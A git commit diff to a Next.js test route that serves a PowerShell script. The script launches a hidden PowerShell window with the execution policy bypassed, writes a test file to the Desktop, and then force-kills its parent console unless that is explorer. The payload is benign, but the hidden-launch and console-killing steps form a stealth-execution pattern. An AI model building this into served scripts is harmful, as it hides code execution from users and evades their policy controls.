bc3d30a822969ce14f3a4c2301df3209f776c133
kaliiiiiiiiii <aurinliun@gmx.ch>
2024-08-05 15:32:28 +0200

    add exit cmdc

--- app/test/route.ts
+++ app/test/route.ts
@@ -7,7 +7,11 @@ export async function GET(req: NextRequest) {
         Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
         Read-Host
     }
-    Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString())
+    Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
+    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
+    $parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
+    if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
+    Exit
     `
   return new NextResponse(script, {
     status: 200,
